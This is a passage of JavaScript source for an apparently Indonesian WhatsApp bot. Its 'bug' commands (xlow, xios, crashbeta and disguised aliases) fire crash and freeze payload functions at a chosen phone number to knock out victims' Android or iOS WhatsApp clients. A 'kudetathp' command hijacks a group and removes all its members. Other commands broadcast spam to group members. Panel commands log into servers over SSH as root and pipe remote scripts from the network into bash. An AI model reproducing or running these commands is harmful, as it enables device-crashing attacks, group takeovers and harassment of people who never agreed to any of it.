        rzxReply("Berhasil mengirim bug ke @" + userJid.split('@')[0] + " menggunakan *xpayment* ✅\n\nTunggu 2 menit agar bot tidak diblokir.", [userJid]);
    }
break
case 'bcmem':{
      if (!isGroup) return rzxReply(mess.only.group)
        if (!isOwner) return rzxReply(mess.owner);
        if (!q) return rzxReply(`Teks Nya Bang?\nContoh: ${prefix+command} Hallo`);
 setrzxReply("waitt.....! sedang memuat")
        let mem = [];
	    groupMembers.map( i => mem.push(i.id) )
       // let anu = await store.chats.all().map((v) => v.id);
        for (let yoi of mem) {
          if (yoi.includes('.net')) {
          	await sleep (6000)
            rzx.sendMessage(yoi, {text: `${q}`});
          }
        }
        rzxReply(`Succes`);
        }
break
case 'rvo': {
			if (!isQuotedViewOnce) return rzxReply("Reply view once")
			let type = Object.keys(m.quoted.message)[0]
			let quotedType = m.quoted.message[type]
			let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
			let buffer = Buffer.from([])
			for await (const chunk of media) {
				buffer = Buffer.concat([buffer, chunk])
			}
			if (type == "videoMessage") {
				await rzx.sendMessage(m.chat, {
					video: buffer,
					caption: quotedType.caption
				})
			} else if (type == "imageMessage") {
				await rzx.sendMessage(m.chat, {
					image: buffer,
					caption: quotedType.caption
				})
			}
		}
break
case "tourl": {
			if (!/video/.test(mime) && !/image/.test(mime)) return rzxReply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
			if (!quoted) return rzxReply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
			let {
				UploadFileUgu,
				webp2mp4File,
				TelegraPh
			} = require('./all/uploader')
			let media = await rzx.downloadAndSaveMediaMessage(quoted)
			if (/image/.test(mime)) {
				let anu = await TelegraPh(media)
				let copyURL = util.format(anu)
				wek = `\"${util.format(anu)}\"`
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								contextInfo: {
									mentionedJid: [m.sender],
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: global.xchannel.jid,
										newsletterName: '🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉',
										serverMessageId: -1
									},
									businessMessageForwardInfo: {
										businessOwnerJid: rzx.decodeJid(rzx.user.id)
									},
								},
								body: proto.Message.InteractiveMessage.Body.create({
									text: wek
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: packname,
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									title: `Hiii, @${m.sender.split("@")[0]} Here is your TelegraPH.Link!\n`,
									subtitle: "🩸⃟༑⌁⃰𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚ཀ͜͡🐉",
									hasMediaAttachment: true,
									...(await prepareWAMessageMedia({
										image: {
											url: `${util.format(anu)}`
										}
									}, {
										upload: rzx.waUploadToServer
									}))
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [{
										"name": "cta_copy",
										"buttonParamsJson": `{\"display_text\":\"Copy Url\",\"id\":\"123456789\",\"copy_code\":\"${copyURL}\"}`
									}, ],
								})
							})
						}
					}
				}, {})

				await rzx.relayMessage(msg.key.remoteJid, msg.message, {
					messageId: msg.key.id
				}, {
					quoted: m
				})
			}
		}
// BATAS BUG
             break
             case "public": {
if (!isOwner) return rzxReply(mess.only.premium)
rzx.public = true
rzxReply("Berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {
if (!isOwner) return rzxReply(mess.only.premium)
rzx.public = false
rzxReply("Berhasil mengganti mode bot menjadi *Self*")
}
break
case "panel": {
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hii Bro 😎@${sender.split("@")[0]} 👋*


CPANEL SIMPLE V1
CARA CREATE SERVER - RIZXVELZ⚡

RAM USER,NOMOR WANGSAF

CONTOH : 1gb RizxzSellVps,628XXXXX

╭━━•›【﻿ 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗣𝗘𝗥𝗦𝗢𝗡 】
│㞮 𝗪𝗵𝗮𝘁𝘀𝗮𝗽𝗽 : *62895364760801*
│㞮 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 : *t.me/RizxzSellVps*
╰━ ━ ━ ━ ━•━•⩵【﻿㞮 - *RIZXVELZ⚡* ⚡】`
rzx.sendMessage(target, { image: { url: `https://telegra.ph/file/f4eb00f42334b75df3c09.jpg` }, text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case 'remini': case 'hd': case 'hdr': {
if (!quoted) return rzxReply(`Fotonya Mana?`)
if (!/image/.test(mime)) return rzxReply(`Send/rzxReply Foto Dengan Caption ${prefix + command}`)
rzxReply(resbug)
let media = await quoted.download()
let proses = await remini(media, "enhance");
rzx.sendMessage(m.chat, { image: proses, caption: 'bilang apa?'}, { quoted: m})
}
break
case " k": case "kick": {
if (!isGroup) return rzxReply(mess.only.group)
if (!isAdmins && !isOwner) return rzxReply(mess.only.admin)
if (!isBotAdmins) return rzxReply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rzx.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => rzxReply(util.format(res))).catch((err) => rzxReply(util.format(err)))
}
break
case "linkgc": case "linkgroup":{
if (!isGroup) return rzxReply(mess.only.group)
if (!isAdmins && !isOwner) return rzxReply(mess.only.admin)
if (!isBotAdmins) return rzxReply(mess.only.badmin)
const url = await rzx.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
rzxReply(asu)
}
break
case "owner": {
const repf = await rzx.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
rzx.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Kuh`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "addowner":
if (!isOwner) return rzxReply(mess.only.owner)
if (!args[0]) return rzxReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await rzx.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return rzxReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
rzxReply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return rzxReply(mess.only.owner)
if (!args[0]) return rzxReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
rzxReply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addprem":{
if (!isOwner) return rzxReply(mess.only.owner)
if (!args[0]) return rzxReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await rzx.onWhatsApp(prrkek)
if (ceknya.length == 0) return rzxReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
rzxReply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isOwner) return rzxReply(mess.only.owner)
if (!args[0]) return rzxReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
rzxReply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
// MENU BUG
break
case 'xrzx': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
if (!q) return rzxReply(`Example:\n ${prefix + command} 62xxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
				let sections = [{
						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
						highlight_label: "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑨𝒏𝒅𝒓𝒐🐉",
						rows: [{
							title: 'X̥ͦ  R̬̂Î̬Ẑ̬X̬̂Ẑ̬ Â̬N̬̂D̬̂R̬̂Ô̬',
							id: `xlow ${target}`
						}]
					},
					{
						highlight_label: "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑨𝒏𝒅𝒓𝒐🐉",
						rows: [{
							title: 'X̥ͦ  T̬̂R̬̂Â̬Ŝ̬Ĥ  ̬ L̬̂Ô̬Ĉ̬K̬̂',
							id: `xmed ${target}`
						}]
					},
					{
						highlight_label: "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑨𝒏𝒅𝒓𝒐🐉",
						rows: [{
							title: 'X̥ͦ  Î̬N̬̂F̬̂Î̬N̬̂Î̬X̬̂   Ĉ̬R̬̂Â̬Ĥ̬',
							id: `xhard ${target}`
						}]
					},
					{
						title: '⌜ 𝐈𝚯𝐒 ⌟',
						highlight_label: "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑰𝒐𝒔𝒔🐉",
						rows: [{
							title: 'X̥ͦ  Ĉ̬R̬̂Ŝ̬Â̬Ĥ̬  Î̬Ô̬Ŝ̬͒',
							id: `xios ${target}`
						}]
					},
					{
						highlight_label: "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑰𝒐𝒔𝒔🐉",
						rows: [{
							title: 'X̥ͦ  K̬̂Î̬L̬̂L̬̂  Î̬Ô̬Ŝ̬',
							id: `xip ${target}`
						}]
					},
					{
						highlight_label: "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑰𝒐𝒔𝒔🐉",
						rows: [{
							title: 'X̥ͦ  T̬̂R̬̂Â̬V ̬̂ Î̬Ô̬Ŝ̬',
							id: `iphone ${target}`
						}]
					},
					{
						title: '⌜ 𝑵𝑬𝑾 𝑩𝑬𝑻𝑨 ⌟',
						highlight_label: "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑩𝒆𝒕𝒂𝒂🐉",
						rows: [{
							title: 'X̥ͦ  Ĉ̬R̬̂Â̬Ŝ̬Ĥ̬  F̬̂L̬̂Ô̬Ŵ̬͒',
							id: `crashbeta ${target}`
						}]
					},
					{
						highlight_label: "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑩𝒆𝒕𝒂𝒂🐉",
						rows: [{
							title: 'X̥ͦ  V̬̂Â̬Ŝ̬Î̬Ô̬N̬̂',
							id: `xvasionbeta ${target}`
						}]
					},
					{
						highlight_label: "🎭፝⃟𝑹𝒊𝒛𝒙𝒛𝑪𝒓𝒂𝒔𝒉𝑩𝒆𝒕𝒂𝒂🐉",
						rows: [{
							title: 'Ô̬V̬̂Ê̬R̬̂ F̬̂L̬̂Ô̬Ŵ̬',
							id: `overbeta ${target}`
						}]
					}]
let listMessage = {
    title: '⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓〽️ ⌟  ⿻', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "1203632@newsletter",
 newsletterName: '𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚[𝐟𝐮𝐜𝐤 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩]🐉', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: rzx.decodeJid(rzx.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: (`🔥፝⃟𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠
 
 >> 𝑨𝒕𝒕𝒂𝒄𝒌𝒊𝒏𝒈 : ${target}

 ⿻  ⌜ 𝑹𝒊𝒛𝒙𝒛𝑻𝒛𝒚𝑵𝒐𝒄𝒐𝒖𝒏𝒕𝒆𝒓🐉 ⌟  ⿻`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: "𝐑𝐢𝐳𝐱𝐳",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./Media/BugRizxz.jpg")}, { upload: rzx.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},  {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"𝑪𝒓𝒆𝒅𝒊𝒕𝒔\",\"url\":\"https://wa.me/62895364760801\",\"merchant_url\":\"https://www.google.com\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await rzx.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
// CASE BUG
break 
case 'xlow':
case 'xmed':
case 'xhard': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
if (!q) return rzxReply(`Example:\n ${prefix + command} 62xxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
rzxReply(donebug)
await buk1(rzx, target, "KENALIN NIH RIZXZMODS", 1020000, ptcp = true);
await frezebug(target, dottm)
await beta1(rzx, target, dottm)
await beta2(rzx, target, dottm)
}
break 
case 'xios':
case 'xip':
case 'iphone': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
if (!q) return rzxReply(`Example:\n ${prefix + command} 62xxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
rzxReply(donebug2)
await buk1(rzx, target, "KENALIN NIH RIZXZMODS", 1020000, ptcp = true);
await frezebug(target, dottm)
await beta1(rzx, target, dottm)
await beta2(rzx, target, dottm)
}
break 
case 'crashbeta':
case 'xvasionbeta':
case 'overbeta': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
if (!q) return rzxReply(`Example:\n ${prefix + command} 62xxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
rzxReply(donebug3)
await buk1(rzx, target, "KENALIN NIH RIZXZMODS", 1020000, ptcp = true);
await frezebug(target, dottm)
await beta1(rzx, target, dottm)
await beta2(rzx, target, dottm)
}
break
case 'paket?':
case 'halo_bg':
case 'kenal_rizxz?':
case 'riper?':
case 'lawak_ngerip':
case 'assalamualaikum':
case 'jualbokep?':
case 'jualakun?':
case 'vcs_brp?':
case 'colmek_brp?':
case 'paptt_brp?':
case 'permisi_paket':
case 'gua_bacok_lu':
case 'gua_sbnrnya_suka':
case 'yatim_anj':
case 'ampas':
case 'bokep_tayo':
case 'lu_dmn?':
case 'info_tobrut':
case 'lu_siapa?': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
rzxReply(donebug3)
await buk1(rzx, target, "KENALIN NIH RIZXZMODS", 1020000, ptcp = true);
await frezebug(target, dottm)
await beta1(rzx, target, dottm)
await beta2(rzx, target, dottm)
}
// BATAS BUG
break 
case 'kudetathp': {
if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
if (!isGroup) return rzxReply(`Khusus Dalam Group Bego`)
if (!isAdmins && !isCreator) return Painzyrzx.sendMessage('Khusus Admin')
if (!isBotAdmins) return rzx.sendMessage(`Bot Bukan Admin Bego`)
await rzx.groupUpdateSubject(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝗥𝗜𝗭𝗫𝗫 𝗪𝗔𝗡𝗚𝗦𝗔𝗙𝗙')
await rzx.groupUpdateDescription(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝗥𝗜𝗭𝗫𝗭 𝗪𝗔𝗡𝗚𝗦𝗔𝗙𝗙')
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupMetadata.owner && x !== kontributor + "@s.whatsapp.net") {
await rzx.groupParticipantsUpdate(m.chat, [x], "remove")
}}}
break
case 'enc':
case 'encrypt':
case 'obfuscate': {
if (!q) return rzxReply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
rzxReply(`${meg.result}`)
}
break 
case 'uninstallpanel': {
    if (!isOwner) return rzxReply(msg.owner);
    let t = text.split(',');
    if (t.length < 2) return rzxReply(`*Format salah!*\nPenggunaan: ${prefix}uninstallpanel ipvps,password`);
    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = 'bash <(curl -s https://pterodactyl-installer.se)';

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
    conn.on('ready', () => {
        rzxReply('*PROSES UNINSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 20 DETIK*');
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
            }).on('data', (data) => {
                console.log('STDOUT: ' + data);
                if (data.toString().includes('Input')) {
                    if (data.toString().includes('6')) {
                        stream.write('6\n');
                    } else if (data.toString().includes('y/n')) {
                        stream.write('y\n');
                    } else {
                        stream.write('\n');
                    }
                }
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);
    await new Promise(resolve => setTimeout(resolve, 20000));
    if (isSuccess) {
            rzxReply('`SUKSES UNINSTALL PANEL ANDA, SILAHKAN CEK`');
        }
   }
break
case 'uninstalltheme': {
    if (!isOwner) return (mess.premium)
let t = text.split(',');
    if (t.length < 2) return rzxReply(`*Format salah!*\nPenggunaan: ${prefix}uninstalltheme ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    function RizxzWangsaff(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }
    const command = 'bash <( curl -s https://raw.githubusercontent.com/Ibzz-Official/Install-Theme-Pterodactyl-By-Ibzz-Official/main/install.sh)'

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        rzxReply('𝗣𝗥𝗢𝗦𝗘𝗦 𝗨𝗡𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗧𝗛𝗘𝗠𝗘 𝗗𝗜𝗠𝗨𝗟𝗔𝗜 𝗠𝗢𝗛𝗢𝗡 𝗧𝗨𝗡𝗚𝗚𝗨 𝟯 𝗠𝗘𝗡𝗜𝗧 𝗞𝗘𝗗𝗘𝗣𝗔𝗡');
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
            }).on('data', (data) => {
                stream.write('\n');
                stream.write('2\n');
                stream.write('y\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        rzxReply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
    
    // Tambahkan jeda 3 menit (180000 ms) sebelum mengirim pesan "success uninstall theme"
    setTimeout(() => {
        if (isSuccess) {
            rzxReply('𝗦𝗨𝗖𝗖𝗘𝗦 𝗨𝗡𝗜𝗡𝗦𝗧𝗔𝗟𝗟 𝗧𝗛𝗘𝗠𝗘 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 𝗖𝗢𝗕𝗔 𝗖𝗘𝗞');
        }
    }, 180000); // 180000 ms = 3 menit
    
    
}
break
case 'installpanelv1': {
    if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
    let t = text.split(',');
    if (t.length < 5) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}installpanelv1 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        m.reply('*𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗣𝗔𝗡𝗘𝗟𝗩2 𝗠𝗢𝗛𝗢𝗡 𝗧𝗨𝗡𝗚𝗚𝗨 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        m.reply('𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗪𝗜𝗡𝗚𝗦 𝗦𝗔𝗕𝗔𝗥 𝗬𝗔 𝗠𝗔𝗡𝗜𝗘𝗭');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/Rizxcode/thema/main/install.sh)';
        m.reply('𝗠𝗘𝗠𝗨𝗟𝗔𝗜 𝗖𝗥𝗘𝗔𝗧𝗘 𝗡𝗢𝗗𝗘 & 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        m.reply(`𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n\n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: admin\n𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: 123\n𝗟𝗢𝗚𝗜𝗡: ${subdomain}\n\n𝗡𝗼𝘁𝗲: 𝗦𝗲𝗺𝘂𝗮 𝗜𝗻𝘀𝘁𝗮𝗹𝗮𝘀𝗶 𝗧𝗲𝗹𝗮𝗵 𝗦𝗲𝗹𝗲𝘀𝗮𝗶 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗖𝗿𝗲𝗮𝘁𝗲 𝗔𝗹𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗗𝗶 𝗡𝗼𝗱𝗲 𝗬𝗮𝗻𝗴 𝗗𝗶 𝗯𝘂𝗮𝘁 𝗢𝗹𝗲𝗵 𝗕𝗼𝘁 𝗗𝗮𝗻 𝗔𝗺𝗯𝗶𝗹 𝗧𝗼𝗸𝗲𝗻 𝗖𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗱𝗮𝗻 𝗸𝗲𝘁𝗶𝗸 .𝘀𝘁𝗮𝗿𝘁𝘄𝗶𝗻𝗴𝘀 (𝘁𝗼𝗸𝗲𝗻) \n𝗡𝗼𝘁𝗲: 𝗛𝗔𝗥𝗔𝗣 𝗧𝗨𝗡𝗚𝗚𝗨 𝟭-𝟱𝗠𝗘𝗡𝗜𝗧 𝗕𝗜𝗔𝗥 𝗪𝗘𝗕 𝗕𝗜𝗦𝗔 𝗗𝗜 𝗕𝗨𝗞𝗔`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`123\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('rizaljomok\n');
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Bot auto Installer Rizxvelz🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('RIZXVELZ-VVIP\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}
break
case "installpanelv2": {
    if (!isPremium && !isOwner) return rzxReply(mess.only.premium)
    let t = text.split(',');
    if (t.length < 5) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}installpanelv2 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        m.reply('*𝗣𝗥𝗢𝗦𝗘𝗦 𝗣𝗘𝗡𝗚𝗜𝗡𝗦𝗧𝗔𝗟𝗟𝗔𝗡 𝗣𝗔𝗡𝗘𝗟𝗩2 𝗠𝗢𝗛𝗢𝗡 𝗧𝗨𝗡𝗚𝗚𝗨 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
